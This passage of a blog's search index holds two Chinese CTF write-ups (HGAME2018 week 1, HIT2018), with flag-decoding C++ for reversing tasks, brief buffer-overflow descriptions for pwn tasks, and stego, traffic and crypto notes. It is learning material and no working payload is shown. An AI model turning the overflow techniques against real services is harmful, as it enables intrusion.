class="number">162</span>,<span class="number">206</span>,<span class="number">140</span>,<span class="number">238</span>,<span class="number">32</span>,<span class="number">194</span>,<span class="number">152</span>,<span class="number">160</span>,<span class="number">208</span>,<span class="number">205</span>,<span class="number">35</span>,<span class="number">166</span>,<span class="number">106</span>,<span class="number">130</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//int a;</span></span><br><span class="line"><span class="comment">//while(cin&gt;&gt;a)&#123;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;indx[a]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">256</span>;++j)&#123;</span><br><span class="line"><span class="keyword">if</span>(indx[j]==arr[i])&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">int</span>(*(<span class="keyword">char</span>*)(&amp;j))&lt;&lt;<span class="string">','</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//baby2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> arr[]=&#123;<span class="number">141</span>,<span class="number">153</span>,<span class="number">71</span>,<span class="number">245</span>,<span class="number">246</span>,<span class="number">85</span>,<span class="number">245</span>,<span class="number">217</span>,<span class="number">96</span>,<span class="number">209</span>,<span class="number">219</span>,<span class="number">21</span>,<span class="number">228</span>,<span class="number">196</span>,<span class="number">102</span>,<span class="number">208</span>,<span class="number">164</span>,<span class="number">141</span>,<span class="number">86</span>,<span class="number">95</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//for(int i=0;i&lt;20;++i)&#123;</span></span><br><span class="line"><span class="comment">//newa[indx[i]]=arr[i];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//for(int i=0;i&lt;20;++i)&#123;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;newa[i]&lt;&lt;',';</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">swap(arr[<span class="number">10</span>],arr[<span class="number">15</span>]);</span><br><span class="line">swap(arr[<span class="number">10</span>],arr[<span class="number">6</span>]);</span><br><span class="line">swap(arr[<span class="number">6</span>],arr[<span class="number">3</span>]);</span><br><span class="line">swap(arr[<span class="number">3</span>],arr[<span class="number">1</span>]);</span><br><span class="line">swap(arr[<span class="number">0</span>],arr[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d,"</span>,arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//baby3.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">uint8_t</span> arr[]=&#123;<span class="number">208</span>,<span class="number">141</span>,<span class="number">71</span>,<span class="number">153</span>,<span class="number">246</span>,<span class="number">85</span>,<span class="number">245</span>,<span class="number">217</span>,<span class="number">96</span>,<span class="number">209</span>,<span class="number">245</span>,<span class="number">21</span>,<span class="number">228</span>,<span class="number">196</span>,<span class="number">102</span>,<span class="number">219</span>,<span class="number">164</span>,<span class="number">141</span>,<span class="number">86</span>,<span class="number">95</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flg[<span class="number">22</span>]=<span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line"><span class="built_in">bitset</span>&lt;8&gt; a(arr[i]);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">1</span>)&#123;</span><br><span class="line">a=(a&lt;&lt;<span class="number">6</span>)|(a&gt;&gt;<span class="number">2</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">2</span>)&#123;</span><br><span class="line">a=(a&gt;&gt;<span class="number">4</span>)|(a&lt;&lt;<span class="number">4</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">3</span>)&#123;</span><br><span class="line">a=(a&lt;&lt;<span class="number">2</span>)|(a&gt;&gt;<span class="number">6</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">a=(a&gt;&gt;<span class="number">1</span>)|(a&lt;&lt;<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">' '</span>&lt;&lt;a.to_ulong()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">flg[i]=a.to_ulong();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span>(flg[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要说一下……<br>C/C++的左右移有毒！换bitset保平安！</p><h2 id="nop-pop"><a href="#nop-pop" class="headerlink" title="nop_pop"></a>nop_pop</h2><p>一月霸权当然是我pop team epic啦！食我粪作！<br>EXEinfo显示是PE文件，那就运行一下看<br><br>打开OD搜一下<br><img src="/HGAME2018-week1WP/snipaste20180204_233230.png" title="nop_pop2"><br>先是把跳转nop掉，然后出来那个Con...的，联系出题人，出题人表示是要nop掉pop子<br>于是再看，然后发现上面有个nop_me（提示真明显wwwww）<br>nop掉，程序发给出题人，得到flag</p><h2 id="sc2-player"><a href="#sc2-player" class="headerlink" title="sc2_player"></a>sc2_player</h2><p>看了一下程序F5出来的东西大概做了这几步操作</p><ul><li>arr=(index%7+35)^special</li><li>special(index%7)=special^0x34</li><li>arr=input^ index^(index/7)<br>这几个都是长度为28的数组，arr是最后用来比对的数组，input是输入的flag，special是一个程序存储的数组<br>所以前两步有什么意义……<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sc2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">29</span>]=&#123;<span class="number">104</span>,<span class="number">98</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">127</span>,<span class="number">72</span>,<span class="number">50</span>,<span class="number">127</span>,<span class="number">86</span>,<span class="number">124</span>,<span class="number">99</span>,<span class="number">63</span>,<span class="number">82</span>,<span class="number">101</span>,<span class="number">72</span>,<span class="number">108</span>,<span class="number">77</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">74</span>,<span class="number">96</span>,<span class="number">115</span>,<span class="number">127</span>,<span class="number">124</span>,<span class="number">101</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">28</span>;++i)&#123;</span><br><span class="line">arr[i]=arr[i]^i^(i/<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">28</span>;++i)&#123;</span><br><span class="line"><span class="built_in">putchar</span>(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>前两题做的时候不在家，借朋友电脑用了下</p><h2 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h2><p>其实是很明显的溢出，scanf这个东西不安全，可以直接覆盖到比较的数字<br><img src="/HGAME2018-week1WP/snipaste20180207_222045.png" title="guess_number"></p><h2 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h2><p>还是输入超限，不过一开始要输入长度而且还不能大于63，后面的对比又用!=（继续吐槽我那个超喜欢用!=的队友<br>所以输入一个负数就好了<br>然后就可以覆盖到猜测的数字了<br><img src="/HGAME2018-week1WP/snipaste20180207_221248.png" title="flag_server"></p><h2 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h2><p>先看整个流程，发现它先把flag读进了一个固定地址<br>这次换成了read，但是大小却是188，于是还是能搞事，直接用地址覆盖后面的*s就能输出flag了<br><br>本机测试过关直接发payload了，顺便*s后面是计数器，所以可以覆盖可以不覆盖，但是不能改成0，那样就直接退出了<br><img src="/HGAME2018-week1WP/snipaste20180207_220202.png" title="zazahui2"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="白菜1"><a href="#白菜1" class="headerlink" title="白菜1"></a>白菜1</h2><p>先用stegsolver打开看了一遍，都没东西<br>于是考虑lsb（算是常规套路了吧）<br><img src="/HGAME2018-week1WP/snipaste20180205_012851.png" title="白菜1_1"><br>然后文件头不熟练的我还跑了下binwalk,wwwwwww<br><img src="/HGAME2018-week1WP/snipaste20180205_013254.png" title="白菜1_2"><br>就是个zip包，解压出来就是flag</p><h2 id="白菜2"><a href="#白菜2" class="headerlink" title="白菜2"></a>白菜2</h2><p>跑一下binwalk，发现有东西<br>然后就得到了flag<br><img src="/HGAME2018-week1WP/snipaste20180204_230153.png" title="白菜2"></p><h2 id="pacp1"><a href="#pacp1" class="headerlink" title="pacp1"></a>pacp1</h2><p>搜下flag<br><img src="/HGAME2018-week1WP/snipaste20180204_225419.png" title="pacp1_1"><br>看最后这个返回200的分组<br><img src="/HGAME2018-week1WP/snipaste20180204_225549.png" title="pacp1_2"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>知识点全部给出来了哇，真系给力</p><h2 id="easy-Caesar"><a href="#easy-Caesar" class="headerlink" title="easy Caesar"></a>easy Caesar</h2><p>一开始题目还有错，于是找出题人说，拿到了1血（然而改错没加分wwww）<br>直接上工具<br><br>然后数字也有变过，那么按照常识判断，就是qu1ck,4x,la2y,br0wn<br>于是有了flag</p><h2 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h2><p>看到的时候就反应过来了，可惜当时没找到工具手解的……<br>看它给的提示网址<a href="https://www.wikiwand[.]com/en/Polybius#/Cryptography就行了，这种出题真的很照顾人了" target="_blank" rel="noopener">https://www.wikiwand[.]com/en/Polybius#/Cryptography就行了，这种出题真的很照顾人了</a></p><h2 id="Hill"><a href="#Hill" class="headerlink" title="Hill"></a>Hill</h2><p>学到了一种新的加密方式，不过要算数论中矩阵的逆，如果阶数高了，感觉就是灾难啊……<br>顺便我又没找到工具一开始还没仔细看链接，矩阵的逆还是手算的……淦了<br>同样的<a href="https://www.wikiwand[.]com/en/Hill_cipher" target="_blank" rel="noopener">https://www.wikiwand[.]com/en/Hill_cipher</a><br><img src="/HGAME2018-week1WP/snipaste20180204_221038.png" title="Hill"></p><h2 id="confusion"><a href="#confusion" class="headerlink" title="confusion"></a>confusion</h2><p>这个题就比较舒服，不就是大杂烩嘛，上工具~<br><img src="/HGAME2018-week1WP/snipaste20180204_211631.png" title="confusion1"><br><img src="/HGAME2018-week1WP/snipaste20180204_211959.png" title="confusion2"><br><img src="/HGAME2018-week1WP/snipaste20180204_212008.png" title="confusion3"><br><img src="/HGAME2018-week1WP/snipaste20180204_212027.png" title="confusion4"></p><h2 id="baby-step"><a href="#baby-step" class="headerlink" title="baby step"></a>baby step</h2><p>刚学完密码学，然而不想自己手写<br>网上直接找的python脚本太腊鸡了……慢得不行<br>最后换ACM大佬博客找的就好了<br>解出来基础解是191091022097，然后加上i个0x1111111111模0x976693344d的逆元就好，顺便后面这个数是质数，所以逆元可以用费马小定理算</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
            <tag> PWN </tag>
            
            <tag> Web </tag>
            
            <tag> Rev </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HIT2018新生赛部分WP</title>
      <link href="/HIT2018%E6%96%B0%E7%94%9F%E8%B5%9B/"/>
      <url>/HIT2018%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
      <content type="html"><![CDATA[<p>只会写水题，要好好学习了</p><a id="more"></a><h2 id="Baby-Android"><a href="#Baby-Android" class="headerlink" title="Baby Android"></a>Baby Android</h2><p>安卓逆向助手打开，发现就是异或，两个字符串摘一下异或一下得到flag</p><img src="/HIT2018新生赛/snipaste20180201_181332.jpg" title="Baby_Android"><h2 id="Easy-XOR"><a href="#Easy-XOR" class="headerlink" title="Easy_XOR"></a>Easy_XOR</h2><p>发现出题人拿同一个密钥加密了两个文件，而且还有一份明文，直接异或得到flag（所以感觉这个是不是没考中考点？）</p><img src="/HIT2018新生赛/snipaste20180201_115025.jpg" title="EASY_XOR"><h2 id="HITCTF-2018签到"><a href="#HITCTF-2018签到" class="headerlink" title="HITCTF 2018签到"></a>HITCTF 2018签到</h2><p>不会翻墙学个P的计算机呀，翻墙搜索看视频得到flag</p><img src="/HIT2018新生赛/snipaste20180201_090539.jpg" title="签到"><h2 id="BaSO4"><a href="#BaSO4" class="headerlink" title="BaSO4"></a>BaSO4</h2><p>就是base64/32混合嘛，其实这种混合的一般来说很好解，因为</p><ul><li>Base64中有[0-9a-zA-Z+/=]</li><li>Base32中有[A-Z2-7=]</li><li>Base16中有[0-9A-F]</li></ul><p>于是拿出以前写的脚本手动选择跑一下（等有空改成自动的）</p><img src="/HIT2018新生赛/snipaste20180201_094323.jpg" title="BaSO4"><h2 id="攻击流量分析"><a href="#攻击流量分析" class="headerlink" title="攻击流量分析"></a>攻击流量分析</h2><p>看前面就是尝试找flag未遂，一堆404，拖到最后终于看到200。</p><img src="/HIT2018新生赛/snipaste20180201_091517.jpg" title="攻击流量分析1"><p>把数据保存下来跑一边gzuncompress就好</p><p>我是用在线工具搞得，所以为了复制不可见字符先base64一下咯</p><img src="/HIT2018新生赛/snipaste20180201_093215.jpg" title="攻击流量分析2"><h2 id="键盘流量分析"><a href="#键盘流量分析" class="headerlink" title="键盘流量分析"></a>键盘流量分析</h2><p>首先用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r keyboard.pcap -T field -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>把按键数据抓出来</p><p>然后发现只有中间的是8字节的键盘数据，反正也不多就干脆看着敲出来了</p><p>用第三个字节查表，首字节的02表示上档键，这个不知道也可以猜出来</p><img src="/HIT2018新生赛/snipaste20180201_105518.jpg" title="键盘流量分析"><h2 id="use-your-ida（时间到以后突然想到）"><a href="#use-your-ida（时间到以后突然想到）" class="headerlink" title="use_your_ida（时间到以后突然想到）"></a>use_your_ida（时间到以后突然想到）</h2><p>时间到以后群友一说距离视图突然反应过来……</p><p>给大佬递IDA.jpg……</p><img src="/HIT2018新生赛/snipaste20180202_222509.jpg" title="use_your_ida"><p>算是一种隐写吧，大概</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
            <tag> Rev </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
